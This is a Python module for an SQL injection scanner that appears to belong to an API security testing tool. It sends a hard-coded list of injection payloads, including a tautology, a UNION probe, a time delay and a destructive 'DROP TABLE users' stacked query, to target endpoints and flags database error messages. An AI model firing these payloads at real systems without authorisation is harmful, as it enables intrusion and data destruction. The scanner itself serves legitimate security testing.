#!/usr/bin/env python3
import requests
from typing import Dict, List, Optional
from .base_scanner import BaseScanner
from utils.logger import setup_scanner_logger

class SQLiScanner(BaseScanner):
    @staticmethod
    def scan(url: str, method: str, path: str, response: requests.Response, token: Optional[str] = None) -> List[Dict]:
        logger = setup_scanner_logger("sqli_check")
        vulnerabilities = []
        headers = {'Authorization': f'Bearer {token}'} if token else {}
        
        logger.info(f"Testing endpoint: {method} {url}{path}")
        
        payloads = [
            "' OR '1'='1",
            "' UNION SELECT NULL--",
            "admin'--",
            "1; DROP TABLE users--",
            "1' AND SLEEP(5)--"
        ]
        
        for payload in payloads:
            try:
                logger.info(f"Testing payload: {payload}")
                params = {'id': payload, 'user': payload, 'search': payload}
                test_response = requests.request(
                    method,
                    f"{url}{path}",
                    params=params if method == 'GET' else None,
                    json=params if method != 'GET' else None,
                    headers=headers,
                    timeout=10
                )
                
                if any(pattern in test_response.text.lower() for pattern in ['sql syntax', 'mysql error', 'ora-']):
                    vuln = {
                        'type': 'SQL_INJECTION',
                        'severity': 'CRITICAL',
                        'detail': 'Potential SQL injection vulnerability',
                        'evidence': {
                            'url': f"{url}{path}",
                            'method': method,
                            'payload': payload,
                            'response': test_response.text[:200]
                        }
                    }
                    vulnerabilities.append(vuln)
                    logger.warning(f"Found SQL injection vulnerability: {vuln}")
                    
            except requests.RequestException as e:
                logger.error(f"Error testing payload {payload}: {str(e)}")
                continue
                
        return vulnerabilities

scan = SQLiScanner.scan